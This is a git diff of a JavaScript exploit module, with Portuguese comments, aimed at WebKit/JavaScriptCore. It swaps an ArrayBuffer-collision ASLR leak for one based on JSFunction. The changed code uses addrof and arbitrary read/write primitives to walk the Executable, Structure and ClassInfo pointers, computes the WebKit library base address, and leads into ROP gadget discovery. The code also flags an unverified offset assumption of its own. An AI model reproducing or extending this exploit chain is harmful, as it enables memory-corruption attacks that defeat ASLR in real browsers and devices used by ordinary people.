@@ -1,8 +1,8 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v116 - R60 Final com Vazamento REAL e LIMPO de ASLR WebKit - VAZAMENTO POR ARRAYBUFFER (ACEITANDO COLISÃO))
+// js/script3/testArrayBufferVictimCrash.mjs (v117 - R60 Final com Vazamento REAL e LIMPO de ASLR WebKit - VAZAMENTO POR JSFUNCTION)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
-// - **NOVA ESTRATÉGIA DE VAZAMENTO ASLR: Utiliza ArrayBuffer e lida com alocação em slot colidente.**
-// - Aceita o comportamento teimoso do alocador e tenta vazar diretamente do slot problemático.
+// - **NOVA ESTRATÉGIA DE VAZAMENTO ASLR: Vazamento através de JSFunction e seu Executable.**
+// - Objetivo: Contornar problemas persistentes com alocação de ArrayBuffer/Uint8Array.
 // - Removidas estratégias de grooming/ancoragem/drenagem e vazamento relativo por offset.
 // - Priorização do Vazamento de ASLR ANTES de corrupções arbitrárias no heap.
 // - Implementação funcional de vazamento da base da biblioteca WebKit.
@@ -27,7 +27,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v116_R60_REAL_ASLR_LEAK_AB_COLLISION_DEALT";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v117_R60_REAL_ASLR_LEAK_JSFUNCTION";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -53,7 +53,7 @@ let global_spray_objects = [];
 
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Robustez Máxima (Vazamento REAL e LIMPO de ASLR - ArrayBuffer na Colisão) ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Robustez Máxima (Vazamento REAL e LIMPO de ASLR - Vazamento por JSFunction) ---`, "test");
 
     let final_result = { success: false, message: "A verificação funcional de L/E falhou.", details: {} };
     const startTime = performance.now();
@@ -178,93 +178,78 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         };
         logS3(`Primitivas de Leitura/Escrita Arbitrária autocontidas (principais) estão prontas. Tempo: ${(performance.now() - leakerSetupStartTime).toFixed(2)}ms`, "good");
 
-        // --- FASE 4: Vazamento REAL e LIMPO da Base da Biblioteca WebKit (Vazamento por ArrayBuffer) e Descoberta de Gadgets ---
+        // --- FASE 4: Vazamento REAL e LIMPO da Base da Biblioteca WebKit (Vazamento por JSFunction) e Descoberta de Gadgets ---
         logS3("--- FASE 4: Vazamento REAL e LIMPO da Base da Biblioteca WebKit e Descoberta de Gadgets (Funcional) ---", "subtest");
         const leakPrepStartTime = performance.now();
         let webkit_base_address = null;
 
-        logS3("Iniciando vazamento REAL da base ASLR da WebKit através de ArrayBuffer (com addrof direto e aceitando colisão)...", "info");
+        logS3("Iniciando vazamento REAL da base ASLR da WebKit através de JSFunction...", "info");
 
-        // 1. Criar um ArrayBuffer para o vazamento
-        // O ArrayBuffer será alocado em um slot, que é provavelmente o "slot quente" de colisão.
-        // O addrof_primitive(leak_candidate_array_buffer) irá retornar esse endereço.
-        // Assumimos que a estrutura do ArrayBuffer será "sobreposta" no local do confused_array_main
-        // e que podemos ler o Structure* e ClassInfo* DESSA sobreposição.
-        const leak_candidate_array_buffer = new ArrayBuffer(0x100); 
-        logS3(`Objeto ArrayBuffer (tamanho 0x100) criado para vazamento de ClassInfo: ${leak_candidate_array_buffer}`, "debug");
+        // 1. Criar um JSFunction
+        // Uma função simples para usar como objeto de vazamento.
+        const leak_candidate_js_function = function() {};
+        logS3(`Objeto JSFunction criado para vazamento de ClassInfo: ${leak_candidate_js_function}`, "debug");
 
-        // 2. Obter o endereço de memória do objeto leak_candidate_array_buffer
-        // Este é o passo crucial. addrof_primitive fará com que o victim_array_main[0] aponte para leak_candidate_array_buffer.
-        // O confused_array_main[0] (no mesmo slot de memória) então conterá o ponteiro para leak_candidate_array_buffer.
-        const leak_candidate_addr = addrof_primitive(leak_candidate_array_buffer);
-        logS3(`[REAL LEAK] Endereço do leak_candidate (ArrayBuffer): ${leak_candidate_addr.toString(true)}`, "leak");
+        // 2. Obter o endereço de memória do JSFunction
+        const js_function_addr = addrof_primitive(leak_candidate_js_function);
+        logS3(`[REAL LEAK] Endereço do JSFunction: ${js_function_addr.toString(true)}`, "leak");
 
         // *************** VERIFICAÇÃO CRÍTICA DE COLISÃO DO ENDEREÇO DE VAZAMENTO ***************
-        // Obter o endereço base do confused_array_main APÓS a alocação de leak_candidate_array_buffer.
-        // Este endereço DEVE ser o mesmo que leak_candidate_addr, confirmando a sobreposição.
+        // Obter o endereço base do confused_array_main para comparação
         const confused_array_main_addr = addrof_primitive(confused_array_main);
-        logS3(`[REAL LEAK] Endereço da base do confused_array_main (para confirmação da sobreposição): ${confused_array_main_addr.toString(true)}`, "debug");
+        logS3(`[REAL LEAK] Endereço da base do confused_array_main (para comparação): ${confused_array_main_addr.toString(true)}`, "debug");
         
-        let collision_confirmed = false;
-        if (leak_candidate_addr.equals(confused_array_main_addr)) {
-            collision_confirmed = true;
-            logS3(`[REAL LEAK] SUCESSO ESPERADO: ArrayBuffer de vazamento (${leak_candidate_addr.toString(true)}) foi alocado no MESMO endereço base do confused_array_main (${confused_array_main_addr.toString(true)}). Isso confirma a sobreposição esperada para este método de vazamento.`, "good");
+        let collision_detected = false;
+        if (js_function_addr.equals(confused_array_main_addr)) {
+            collision_detected = true;
+            logS3(`[REAL LEAK] ALERTA CRÍTICO: Colisão detectada! O JSFunction de vazamento (${js_function_addr.toString(true)}) foi alocado no MESMO endereço base do confused_array_main (${confused_array_main_addr.toString(true)}). Vazamento provavelmente inválido.`, "critical");
         } else {
-             // Isso seria uma FALHA NESTA ESTRATÉGIA, pois esperamos a colisão para vazar
-             logS3(`[REAL LEAK] ALERTA CRÍTICO: ArrayBuffer de vazamento e confused_array_main NÃO colidiram. Esta estratégia de vazamento pode não ser adequada.`, "error");
-             throw new Error("[REAL LEAK] Estratégia de vazamento por colisão falhou: Endereços não se sobrepõem.");
+             logS3(`[REAL LEAK] SUCESSO: JSFunction de vazamento alocado em endereço DIFERENTE do confused_array_main. Bom sinal para vazamento limpo.`, "good");
+        }
+        
+        if (collision_detected) {
+            throw new Error("[REAL LEAK] Falha de alocação do objeto de vazamento ASLR: Colisão de endereços persistente com JSFunction. Ajustar estratégia.");
         }
         // *************************************************************************************
 
-        // 3. Ler o ponteiro para a Structure* do ArrayBuffer
-        // A leitura é feita a partir do endereço do ArrayBuffer (que é o mesmo do confused_array_main).
-        // Isso assume que, embora o ArrayBuffer esteja "sobreposto", a estrutura JSCell e o ponteiro da Structure
-        // dele são válidos e podem ser lidos.
-        let structure_ptr = arb_read_primitive(leak_candidate_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET)); // Declarado com let
-        
-        // ** Re-adicionando a lógica de tentativa com offset 0x40 caso 0x20 falhe **
-        // Isso é para o caso de o ArrayBuffer ser alocado logo depois (0x20 ou 0x40 bytes)
-        // se a alocação no mesmo endereço for impedida por algum motivo (menos provável agora).
-        if (!isAdvancedInt64Object(structure_ptr) || structure_ptr.equals(AdvancedInt64.Zero) || structure_ptr.equals(AdvancedInt64.NaNValue)) {
-            logS3(`[REAL LEAK] ALERTA: Ponteiro da Structure lido (${structure_ptr.toString(true)}) é inválido com offset 0x0. Tentando offset 0x20 (possível layout adjacente)...`, "warn");
-            // Agora, tentamos ler do endereço *original* + 0x20.
-            let alternative_leak_addr = confused_array_main_addr.add(new AdvancedInt64(0x20, 0)); // Nova variável para offset 0x20
-            structure_ptr = arb_read_primitive(alternative_leak_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET));
-
-            if (!isAdvancedInt64Object(structure_ptr) || structure_ptr.equals(AdvancedInt64.Zero) || structure_ptr.equals(AdvancedInt64.NaNValue)) {
-                logS3(`[REAL LEAK] ALERTA: Ponteiro da Structure lido (${structure_ptr.toString(true)}) é inválido com offset 0x20. Tentando offset 0x40...`, "warn");
-                alternative_leak_addr = confused_array_main_addr.add(new AdvancedInt64(0x40, 0)); // Nova variável para offset 0x40
-                structure_ptr = arb_read_primitive(alternative_leak_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET));
-            }
-            
-            if (!isAdvancedInt64Object(structure_ptr) || structure_ptr.equals(AdvancedInt64.Zero) || structure_ptr.equals(AdvancedInt64.NaNValue)) {
-                 throw new Error(`[REAL LEAK] Falha ao ler ponteiro da Structure do ArrayBuffer. Endereço inválido com todos os offsets testados: ${structure_ptr.toString(true)}. Provável falha de layout do heap.`);
-            }
+        // 3. Ler o ponteiro para o Executable* do JSFunction
+        // Offset: JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET (0x18)
+        const executable_ptr = arb_read_primitive(js_function_addr.add(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET));
+        if (!isAdvancedInt64Object(executable_ptr) || executable_ptr.equals(AdvancedInt64.Zero) || executable_ptr.equals(AdvancedInt64.NaNValue)) {
+            throw new Error(`[REAL LEAK] Falha ao ler ponteiro do Executable do JSFunction. Endereço inválido: ${executable_ptr.toString(true)}`);
         }
-        logS3(`[REAL LEAK] Ponteiro para a Structure* do ArrayBuffer: ${structure_ptr.toString(true)}`, "leak");
+        logS3(`[REAL LEAK] Ponteiro para o Executable* do JSFunction: ${executable_ptr.toString(true)}`, "leak");
 
-        // 4. Ler o ponteiro para a ClassInfo* da Structure do ArrayBuffer
-        const class_info_ptr = arb_read_primitive(structure_ptr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET));
-        if (!isAdvancedInt64Object(class_info_ptr) || class_info_ptr.equals(AdvancedInt64.Zero)) {
-            throw new Error(`[REAL LEAK] Falha ao ler ponteiro da ClassInfo do ArrayBuffer. Endereço inválido: ${class_info_ptr.toString(true)}`);
+        // 4. Ler o ponteiro para a Structure* do Executable
+        // O Executable também é um JSCell, então seu Structure* está em JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET (0x8)
+        const executable_structure_ptr = arb_read_primitive(executable_ptr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET));
+        if (!isAdvancedInt64Object(executable_structure_ptr) || executable_structure_ptr.equals(AdvancedInt64.Zero) || executable_structure_ptr.equals(AdvancedInt64.NaNValue)) {
+            throw new Error(`[REAL LEAK] Falha ao ler ponteiro da Structure do Executable. Endereço inválido: ${executable_structure_ptr.toString(true)}`);
         }
-        logS3(`[REAL LEAK] Ponteiro para a ClassInfo (esperado JSC::JSArrayBuffer::s_info): ${class_info_ptr.toString(true)}`, "leak");
+        logS3(`[REAL LEAK] Ponteiro para a Structure* do Executable: ${executable_structure_ptr.toString(true)}`, "leak");
 
-        // 5. Calcular o endereço base do WebKit
-        // O offset em config.mjs é para JSC::JSArrayBufferView::s_info.
-        // É fundamental que JSC::JSArrayBuffer::s_info tenha o mesmo offset na lib,
-        // ou que o config.mjs seja atualizado com o offset correto para ArrayBuffer.
+        // 5. Ler o ponteiro para a ClassInfo* da Structure do Executable
+        // Offset: JSC_OFFSETS.Structure.CLASS_INFO_OFFSET (0x50)
+        const class_info_ptr = arb_read_primitive(executable_structure_ptr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET));
+        if (!isAdvancedInt64Object(class_info_ptr) || class_info_ptr.equals(AdvancedInt64.Zero) || class_info_ptr.equals(AdvancedInt64.NaNValue)) {
+            throw new Error(`[REAL LEAK] Falha ao ler ponteiro da ClassInfo do Executable. Endereço inválido: ${class_info_ptr.toString(true)}`);
+        }
+        logS3(`[REAL LEAK] Ponteiro para a ClassInfo (esperado JSC::Executable::s_info): ${class_info_ptr.toString(true)}`, "leak");
+
+        // 6. Calcular o endereço base do WebKit
+        // Assumimos que JSC::Executable::s_info tem o mesmo offset da base que JSC::JSArrayBufferView::s_info.
+        // Isso é uma ASSUNÇÃO CRÍTICA e precisa ser validada por engenharia reversa.
         const S_INFO_OFFSET_FROM_BASE = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"], 16), 0);
         webkit_base_address = class_info_ptr.sub(S_INFO_OFFSET_FROM_BASE);
 
-        logS3(`[REAL LEAK] Endereço da ClassInfo s_info do ArrayBuffer: ${class_info_ptr.toString(true)}`, "leak");
-        logS3(`[REAL LEAK] Offset conhecido de JSC::JSArrayBufferView::s_info da base WebKit: ${S_INFO_OFFSET_FROM_BASE.toString(true)}`, "info");
+        logS3(`[REAL LEAK] Endereço da ClassInfo s_info do Executable: ${class_info_ptr.toString(true)}`, "leak");
+        logS3(`[REAL LEAK] Offset conhecido de JSC::JSArrayBufferView::s_info da base WebKit (usado como proxy): ${S_INFO_OFFSET_FROM_BASE.toString(true)}`, "info");
         logS3(`[REAL LEAK] BASE REAL DA WEBKIT CALCULADA: ${webkit_base_address.toString(true)}`, "leak");
 
         if (webkit_base_address.equals(AdvancedInt64.Zero)) {
             throw new Error("[REAL LEAK] Endereço base da WebKit calculado resultou em zero. Vazamento pode ter falhado.");
         } else {
-            logS3("SUCESSO: Endereço base REAL da WebKit OBTIDO via vazamento de s_info do ArrayBuffer.", "good");
+            logS3("SUCESSO: Endereço base REAL da WebKit OBTIDO via vazamento de s_info do Executable.", "good");
         }
 
         // Descoberta de Gadgets (Funcional)
@@ -350,8 +335,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3(`Iniciando limpeza final do ambiente e do spray de objetos...`, "info");
         clearOOBEnvironment({ force_clear_even_if_not_setup: true });
         global_spray_objects = [];
-        // Limpeza de variáveis de spray não utilizadas ou renomeadas
-        // slot_anchors = []; // Não mais utilizada nesta versão
         logS3(`Limpeza final concluída. Tempo total do teste: ${(performance.now() - startTime).toFixed(2)}ms`, "info");
     }
 
